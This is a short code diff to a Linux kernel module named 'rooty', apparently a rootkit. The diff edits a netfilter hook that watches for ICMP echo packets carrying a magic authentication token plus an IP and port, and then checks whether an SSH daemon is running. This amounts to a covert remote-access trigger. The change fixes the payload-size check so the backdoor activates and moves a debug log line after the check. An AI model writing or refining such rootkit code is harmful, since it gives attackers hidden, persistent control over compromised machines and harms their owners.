@@ -127,10 +127,10 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     payload = (struct magic_icmp *)(icmp_header + 1);
     payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
 
-    printk("rooty: ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
-
-    if ( icmp_header->type != ICMP_ECHO || payload_size != 4 || payload->magic != AUTH_TOKEN )
+    if ( icmp_header->type != ICMP_ECHO || payload_size < sizeof(struct magic_icmp) || payload->magic != AUTH_TOKEN )
         return NF_ACCEPT;
+
+    printk("rooty: ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
 
 	if(!isSSHDrunning)
 	{
